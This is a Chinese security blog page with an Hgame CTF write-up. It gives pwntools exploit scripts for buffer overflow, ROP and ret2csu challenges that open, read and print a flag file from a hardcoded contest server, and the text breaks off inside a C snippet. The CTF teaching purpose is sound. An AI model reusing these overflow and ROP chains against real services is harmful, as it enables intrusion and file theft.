@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Mr.Be1ieVe&#39;s Treasure">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg">
+    <meta property="twitter:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg" />
+    
+
+    
+    <meta name="title" content="Hgame" />
+    <meta property="og:title" content="Hgame" />
+    <meta property="twitter:title" content="Hgame" />
+    
+
+    
+    <meta name="description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。">
+    <meta property="og:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    <meta property="twitter:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Mr.Be1ieVe">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Hgame | Mr.Be1ieVe的博客 | Mr.Be1ieVe&#39;s Blog</title>
+
+    <link rel="canonical" href="/post/hgame/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Mr.Be1ieVe&#39;s Treasure</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95">个人原则宪法</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%AE%9E%E8%B7%B5">安全建设实践</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E4%B8%8E%E5%88%86%E6%9E%90">底层原理思考与分析</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-universe.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/" title="[CTF Hgame]">
+                            [CTF Hgame]
+                        </a>
+                        
+                    </div>
+                    <h1>Hgame</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    Mr.Be1ieVe&#39;s Treasure
+                             
+                            on 
+                            Tuesday, January 28, 2020
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h2 id="hard_aaaaa">Hard_AAAAA</h2>
+<p>
+  <img src="/img/Hgame/image-20200116233004577.png" alt="image-20200116233004577">
+
+</p>
+<p>
+  <img src="/img/Hgame/image-20200116233016869.png" alt="image-20200116233016869">
+
+</p>
+<p>V5在-0x31，s在-0xAC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;Let&#39;s 0O0o</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">0O0!&#34;</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;a&#34;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0xAC</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x31</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;0O0o</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">O0&#39;</span>
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>send(payload)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>interactive()
+</span></span></code></pre></div><h2 id="one_shot">One_Shot</h2>
+<p>
+  <img src="/img/Hgame/image-20200117005607628.png" alt="image-20200117005607628">
+
+</p>
+<p>
+  <img src="/img/Hgame/image-20200117005622807.png" alt="image-20200117005622807">
+
+</p>
+<p>0xE0 - 0xC0之后刚好是32位，这样第</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">0xE0</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0xC0</span>)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>send(payload)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;shot!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">6295776</span>)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>send(payload)
+</span></span></code></pre></div><h2 id="rop_level0">ROP_LEVEL0</h2>
+<h2 id="open_read_puts">open_read_puts</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>arch <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./ROP_LEVEL0&#39;</span>)
+</span></span><span style="display:flex;"><span>lib <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>sh <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pwn</span>(ip,port,debug):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">global</span> lib
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">global</span> sh
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> debug <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>:
+</span></span><span style="display:flex;"><span>        sh <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./ROP_LEVEL0&#39;</span>)
+</span></span><span style="display:flex;"><span>        lib <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>        sh <span style="color:#ff79c6">=</span> remote(ip,port)
+</span></span><span style="display:flex;"><span>        lib <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">#lib = ELF(&#39;./home/robye/Desktop/PWN/libc/64-libc-2.27.so&#39;)</span>
+</span></span><span style="display:flex;"><span>    pop_rsi_r15_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400751</span> 
+</span></span><span style="display:flex;"><span>    pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400753</span>
+</span></span><span style="display:flex;"><span>    buf <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x601060</span>
+</span></span><span style="display:flex;"><span>    open_plt <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;open&#39;</span>]
+</span></span><span style="display:flex;"><span>    open_addr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4006A3</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">0x50</span><span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_r15_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0xdeadbeef</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_r15_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;open&#39;</span>])
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">6</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_r15_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0x4004e0</span>)<span style="color:#6272a4">#puts_plt</span>
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#bd93f9">0.5</span>)
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;./flag&#34;</span>)
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>send(<span style="color:#f1fa8c">&#34;./flag</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>interactive()
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span>  <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    pwn(<span style="color:#f1fa8c">&#34;47.103.214.163&#34;</span>,<span style="color:#bd93f9">20003</span>,<span style="color:#bd93f9">1</span> )
+</span></span></code></pre></div><h2 id="ret2csu">ret2csu</h2>
+<p>
+  <img src="/img/Hgame/image-20200117183339217.png" alt="image-20200117183339217">
+
+</p>
+<p>ROP_LEVEL0| SOLVED| ww     <br>
+
+  <img src="/img/Hgame/92YAf7bVfc8a3fUf__thumbnail.png" alt="img">
+
+      重复利用此处的gadget调用read， open， puts将flag输出就行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#bd93f9">1</span> <span style="color:#6272a4">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">2</span> 
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">4</span> <span style="color:#ff79c6">import</span> sys
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">5</span> <span style="color:#ff79c6">import</span> os
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">6</span> 
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">7</span> <span style="color:#6272a4">#context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">8</span> context(arch<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;i386&#39;</span>, os<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;linux&#39;</span>, terminal<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;tmux&#39;</span>, <span style="color:#f1fa8c">&#39;splitw&#39;</span>, <span style="color:#f1fa8c">&#39;-h&#39;</span>])
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">9</span> context<span style="color:#ff79c6">.</span>log_level<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">10</span> debug <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">11</span> d <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">12</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">13</span> <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pwn</span>():
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">14</span>     execve <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./ROP_LEVEL0&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">15</span>     <span style="color:#ff79c6">if</span> debug <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>:
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">16</span>         p <span style="color:#ff79c6">=</span> process(execve)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">17</span>         <span style="color:#ff79c6">if</span> d <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>:
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">18</span>             gdb<span style="color:#ff79c6">.</span>attach(p)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">19</span>     <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">20</span>         <span style="color:#6272a4">#ip = &#34;10.0.%s.140&#34; % sys.argv[1]</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">21</span>         ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;47.103.214.163&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">22</span>         host <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;20003&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">23</span>         p <span style="color:#ff79c6">=</span> remote(ip, host)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">24</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">25</span>     elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./ROP_LEVEL0&#34;</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">26</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">27</span>     main <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40065B</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">28</span>     loc1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400730</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">29</span>     loc2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40074A</span>
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">30</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">31</span>     payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x50</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> p64(loc2)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">32</span>     payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;read&#39;</span>]) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0x10</span>) <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x200</span>) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> p64(loc1)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">33</span>     payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">7</span> <span style="color:#ff79c6">+</span> p64(main)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">34</span>     p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&#34;</span>, payload<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">35</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">36</span>     p<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;./flag</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">37</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">38</span>     payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x50</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> p64(loc2)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">39</span>     payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;open&#39;</span>]) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x200</span>) <span style="color:#ff79c6">+</span> p64(loc1)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">40</span>     payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">7</span> <span style="color:#ff79c6">+</span> p64(main)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">41</span>     p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&#34;</span>, payload<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">42</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">43</span>     raw_input()
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">44</span>     payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x50</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> p64(loc2)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">45</span>     payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;read&#39;</span>]) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0x60</span>) <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x220</span>) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">5</span>) <span style="color:#ff79c6">+</span> p64(loc1)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">46</span>     payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">7</span> <span style="color:#ff79c6">+</span> p64(main)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">47</span>     p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&#34;</span>, payload<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">48</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">49</span>     payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x50</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> p64(loc2)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">50</span>     payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;puts&#39;</span>]) <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>bss() <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x220</span>) <span style="color:#ff79c6">+</span> p64(loc1)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">51</span>     payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">7</span> <span style="color:#ff79c6">+</span> p64(main)
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">52</span>     p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&#34;</span>, payload<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">53</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">54</span>     p<span style="color:#ff79c6">.</span>interactive()
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">55</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">56</span> <span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span> <span style="color:#bd93f9">57</span>     pwn()
+</span></span></code></pre></div><p><a href="http://www.qfrost.com:4000/PWN/%E4%B8%87%E8%83%BDgadget/">http://www.qfrost.com:4000/PWN/%E4%B8%87%E8%83%BDgadget/</a></p>
+<h2 id="number_killer">Number_Killer</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">void</span>) { 
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">//char str[20];
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">long</span> str <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40078d</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">long</span> temp;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">long</span> number <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4196237L</span>;
